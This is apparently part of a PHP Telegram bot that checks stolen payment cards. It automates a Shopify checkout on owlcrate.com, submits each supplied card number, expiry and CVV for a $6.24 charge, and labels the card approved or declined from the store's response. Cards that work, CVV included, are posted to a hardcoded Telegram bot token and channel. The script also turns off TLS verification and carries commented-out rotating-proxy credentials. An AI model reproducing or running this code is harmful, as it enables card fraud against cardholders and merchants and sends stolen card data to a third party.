$headers[] = 'sec-gpc: 1';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'referer: https://www.owlcrate.com/';
$headers[] = 'accept-language: en-GB,en-US;q=0.9,en;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.urlencode($token).'&previous_step=contact_information&step=shipping_method&checkout%5Bemail%5D='.urlencode($email).'&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bbuyer_accepts_marketing%5D=1&checkout%5Bshipping_address%5D%5Bfirst_name%5D=&checkout%5Bshipping_address%5D%5Blast_name%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=&checkout%5Bshipping_address%5D%5Bprovince%5D=&checkout%5Bshipping_address%5D%5Bzip%5D=&checkout%5Bshipping_address%5D%5Bphone%5D=&checkout%5Bshipping_address%5D%5Bfirst_name%5D=Fuck&checkout%5Bshipping_address%5D%5Blast_name%5D=Daddy&checkout%5Bshipping_address%5D%5Baddress1%5D=23+Allen+Street&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=New+York&checkout%5Bshipping_address%5D%5Bcountry%5D=United+States&checkout%5Bshipping_address%5D%5Bprovince%5D=NY&checkout%5Bshipping_address%5D%5Bzip%5D=10010&checkout%5Bshipping_address%5D%5Bphone%5D=%28413%29+265-7846&checkout%5Bremember_me%5D=&checkout%5Bremember_me%5D=0&checkout%5Bbuyer_accepts_sms%5D=0&checkout%5Bsms_marketing_phone%5D=&checkout%5Bclient_details%5D%5Bbrowser_width%5D=412&checkout%5Bclient_details%5D%5Bbrowser_height%5D=737&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=-330');
$curl = curl_exec($ch);
$token2  = Anicap($curl, 'input type="hidden" name="authenticity_token" value="','"');
#echo "authenticity_token 2: $token2 <br><hr>";
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, ''.$shit.'?previous_step=contact_information&step=shipping_method');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
// curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "rteavycr-rotate:f9o3l1ryizdq");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
#$headers[] = 'GET /10918372/checkouts/c9a9326173841b206ace18cef7786228?previous_step=contact_information&step=shipping_method h2';
$headers[] = 'Host: www.owlcrate.com';
$headers[] = 'cache-control: max-age=0';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'user-agent: '.$uas.'';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'sec-gpc: 1';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'referer: https://www.owlcrate.com/';
$headers[] = 'accept-language: en-GB,en-US;q=0.9,en;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$curl = curl_exec($ch);
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, ''.$shit.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
// curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "rteavycr-rotate:f9o3l1ryizdq");
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
#$headers[] = 'POST /10918372/checkouts/c9a9326173841b206ace18cef7786228 h2';
$headers[] = 'Host: www.owlcrate.com';
//$headers[] = 'content-length: 546';
$headers[] = 'cache-control: max-age=0';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'origin: https://www.owlcrate.com';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'user-agent: '.$uas.'';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'sec-gpc: 1';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'referer: https://www.owlcrate.com/';
$headers[] = 'accept-language: en-GB,en-US;q=0.9,en;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.urlencode($token2).'&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D=shopify-US%2520Shipping-5.99&checkout%5Bclient_details%5D%5Bbrowser_width%5D=412&checkout%5Bclient_details%5D%5Bbrowser_height%5D=737&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=-330');
$curl = curl_exec($ch);
$token3  = Anicap($curl,'input type="hidden" name="authenticity_token" value="','"');

#echo "authenticity_token 3: $token3 <br><hr>";
$amount = Anicap($curl,'" data-checkout-payment-due-target="','"');
#echo "amount: $amount <br><hr>";
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, ''.$shit.'?previous_step=shipping_method&step=payment_method');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
// curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "rteavycr-rotate:f9o3l1ryizdq");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
#$headers[] = 'GET /10918372/checkouts/c9a9326173841b206ace18cef7786228?previous_step=shipping_method&step=payment_method h2';
$headers[] = 'Host: www.owlcrate.com';
$headers[] = 'accept: */*';
$headers[] = 'user-agent: '.$uas.'';
$headers[] = 'x-requested-with: XMLHttpRequest';
$headers[] = 'sec-gpc: 1';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://www.owlcrate.com/';
$headers[] = 'accept-language: en-GB,en-US;q=0.9,en;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$curl = curl_exec($ch);
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, ''.$shit.'?step=payment_method');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
// curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "rteavycr-rotate:f9o3l1ryizdq");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
#$headers[] = 'GET /10918372/checkouts/c9a9326173841b206ace18cef7786228?step=payment_method h2';
$headers[] = 'Host: www.owlcrate.com';
$headers[] = 'accept: */*';
$headers[] = 'user-agent: '.$uas.'';
$headers[] = 'x-requested-with: XMLHttpRequest';
$headers[] = 'sec-gpc: 1';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://www.owlcrate.com/';
$headers[] = 'accept-language: en-GB,en-US;q=0.9,en;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$curl = curl_exec($ch);
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://deposit.us.shopifycs.com/sessions');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
// curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "rteavycr-rotate:f9o3l1ryizdq");
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'POST /sessions HTTP/1.1';
$headers[] = 'Host: deposit.us.shopifycs.com';
$headers[] = 'Connection: keep-alive';
//$headers[] = 'Content-Length: 160';
$headers[] = 'Accept: application/json';
$headers[] = 'User-Agent: '.$uas.'';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Sec-GPC: 1';
$headers[] = 'Origin: https://checkout.shopifycs.com';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Referer: https://checkout.shopifycs.com/';
//$headers[] = 'Accept-Encoding: gzip, deflate, br';
$headers[] = 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credit_card":{"number":"'.$cc1.' '.$cc2.' '.$cc3.' '.$cc4.'","name":"Fuck Daddy","month":'.$sub_mes.',"year":'.$ano.',"verification_value":"'.$cvv.'"},"payment_session_scope":"www.owlcrate.com"}');
$curl = curl_exec($ch);
$id2 = Anicap($curl,'"id":"','"');
//echo "id: $id2 <br><hr>";
#echo "curl9: $curl <br><hr>";
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, ''.$shit.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
// curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "rteavycr-rotate:f9o3l1ryizdq");
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
#$headers[] = 'POST /10918372/checkouts/c9a9326173841b206ace18cef7786228 h2';
$headers[] = 'Host: www.owlcrate.com';
#$headers[] = 'content-length: 678';
$headers[] = 'cache-control: max-age=0';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'origin: https://www.owlcrate.com';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'user-agent: '.$uas.'';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'sec-gpc: 1';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'referer: https://www.owlcrate.com/';
//$headers[] = 'accept-encoding: gzip, deflate, br';
$headers[] = 'accept-language: en-GB,en-US;q=0.9,en;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.urlencode($token3).'&previous_step=payment_method&step=&s='.urlencode($id2).'&checkout%5Bpayment_gateway%5D=38480019525&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Btotal_price%5D=624&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=412&checkout%5Bclient_details%5D%5Bbrowser_height%5D=737&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=-330');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$curl = curl_exec($ch);
sleep(5);
curl_close($ch);
/*
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, ''.$shit.'/processing');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
// curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "rteavycr-rotate:f9o3l1ryizdq");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: www.owlcrate.com';
$headers[] = 'cache-control: max-age=0';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'user-agent: '.$uas.'';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*
/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'sec-gpc: 1';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'referer: https://www.owlcrate.com/';
#$headers[] = 'accept-encoding: gzip, deflate, br';
$headers[] = 'accept-language: en-GB,en-US;q=0.9,en;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$curl = curl_exec($ch);
curl_close($ch);
//echo $curl;
*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, ''.$shit.'?from_processing_page=1&validate=true');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
// curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "rteavycr-rotate:f9o3l1ryizdq");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: www.owlcrate.com';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'user-agent: '.$uas.'';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'sec-gpc: 1';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'referer: https://www.owlcrate.com/';
//$headers[] = 'accept-encoding: gzip, deflate, br';
$headers[] = 'accept-language: en-GB,en-US;q=0.9,en;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$result11 = curl_exec($ch);
$cap91 = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
$message = Anicap($result11, '</svg><div class="notice__content"><p class="notice__text">','</p></div></div>');
//echo "Message: $error <br><hr>";
curl_close($ch);
unlink("cookie.txt");




        $content = ['chat_id' => $chat_id, 'text' => "<b>𝑪𝒂𝒓𝒅: <code>$cc|$mes|$ano|$cvv</code> ■■■■■ </b>", 'message_id' => $m3i, 'parse_mode' => 'html'];
        $m4  = EditMessageText($content);
        $m4i = $m4['result']['message_id'];

        if (strpos($result11, 'Thank_you')) {
            $cc_code = 'Approved ✅';
            $message = "Charged $6.24 ✅";
            $full = "SYBLUS\nCC == <code>$cc|$mes|$ano|$cvv</code>\nRES = $cc_code\nREZPONSE- $message";
        $url = "https://api.telegram.org/bot5579015618:AAEnGaXH73gQ0wn7kjrdsskESUr8FmRgGSw/sendMessage?chat_id=-1001722364754&text=".$full."&parse_mode=HTML";
         
        file_get_contents($url);
        } elseif (strpos($result11, '2010 Card Issuer Declined CVV')) {
            $cc_code = 'Approved ✅';
            $full = "SYBLUS\nCC == <code>$cc|$mes|$ano|$cvv</code>\nRES = $cc_code\nREZPONSE- $message";
        $url = "https://api.telegram.org/bot5579015618:AAEnGaXH73gQ0wn7kjrdsskESUr8FmRgGSw/sendMessage?chat_id=-1001722364754&text=".$full."&parse_mode=HTML";
         
        file_get_contents($url);
        } elseif (strpos($result11, '2001 Insufficient Funds')) {
            $cc_code = 'Approved ✅';
            $full = "SYBLUS\nCC == <code>$cc|$mes|$ano|$cvv</code>\nRES = $cc_code\nREZPONSE- $message";
        $url = "https://api.telegram.org/bot5579015618:AAEnGaXH73gQ0wn7kjrdsskESUr8FmRgGSw/sendMessage?chat_id=-1001722364754&text=".$full."&parse_mode=HTML";
         
        file_get_contents($url);
        } elseif(strpos($result11,"Your order is confirmed")){
            $cc_code = "Approved ✅";
            $message = "Charged $6.24✅";
            $full = "SYBLUS\nCC == <code>$cc|$mes|$ano|$cvv</code>\nRES = $cc_code\nREZPONSE- $message";
        $url = "https://api.telegram.org/bot5579015618:AAEnGaXH73gQ0wn7kjrdsskESUr8FmRgGSw/sendMessage?chat_id=-1001722364754&text=".$full."&parse_mode=HTML";
         
        file_get_contents($url);
        }else{
            $cc_code = 'Declined ❌';
        }
        if (empty($result11)) {
            $content = ['chat_id' => $chat_id, 'text' => "<b>┏━━━━━━━━━━━━━━\n┣ 🍁 𝑺𝒉𝒐𝒑𝒊𝒇𝒚 🍁\n┗━━━━━━━━━━━━━━\n══════════════════════\n[ϟ] 𝑮𝑨𝑻𝑬 : <code>𝑺𝒉𝒐𝒑𝒊𝒇𝒚 𝑪𝒉𝒂𝒓𝒈𝒆</code>\n[ϟ] 𝑪𝒂𝒓𝒅 : <code>$cc|$mes|$ano|$cvv</code>\n[ϟ] 𝑹𝒆𝒔𝒖𝒍𝒕 : <code>Unknown error $token</code>\n_𝑩𝒚: @$username [$plan]\n══════════════════════</b>", 'message_id' => $m4i, 'parse_mode' => 'html'];
            $m3  = EditMessageText($content);
            exit();
        }
        // $bank = $data['data']['bank'];
        // $country = $data['data']['country'];
        // $brand = $data['data']['vendor'];
        // $level = $data['data']['level'];
        // $type = $data['data']['type'];
        // $flag = $data['data']['countryInfo']['emoji'];
        $content = ['chat_id' => $chat_id, 'text' => "<b>┏━━━━━━━━━━━━━━\n┣ 🍁 𝑺𝒚𝒃𝒍𝒖𝒔 🍁\n┗━━━━━━━━━━━━━━\n══════════════════════\n[ϟ] 𝑮𝑨𝑻𝑬 : <code>𝑺𝒚𝒃𝒍𝒖𝒔 $6.24</code>\n[ϟ] 𝑪𝒂𝒓𝒅 : <code>$cc|$mes|$ano|$cvv</code>\n[ϟ] 𝑹𝒆𝒔𝒖𝒍𝒕 : <code>$cc_code</code>\n[ϟ] 𝑹𝒆𝒔𝒑𝒐𝒏𝒔𝒆 : <b>$message</b>\n┏━━━━━━━━━━━━━━\n┣ 🍁 𝑩𝑰𝑵 𝑫𝑨𝑻𝑨 🍁\n┗━━━━━━━━━━━━━━\n[ϟ] 𝑩𝒊𝒏 𝑫𝒆𝒕𝒂𝒊𝒍𝒔: $bin - $type - $brand - $level\n[ϟ] 𝑩𝒂𝒏𝒌: $bank\n[ϟ] 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: $country - $flag\n[ϟ] 𝑪𝒉𝒆𝒄𝒌𝒆𝒅 𝑩𝒚: @$username [$plan]\n[ϟ] 𝑩𝒐𝒕 𝑩𝒚 : <code>@BossNetworkk</code>\n══════════════════════</b>", 'message_id' => $m4i, 'parse_mode' => 'html'];
        $m3  = EditMessageText($content);
    }
}
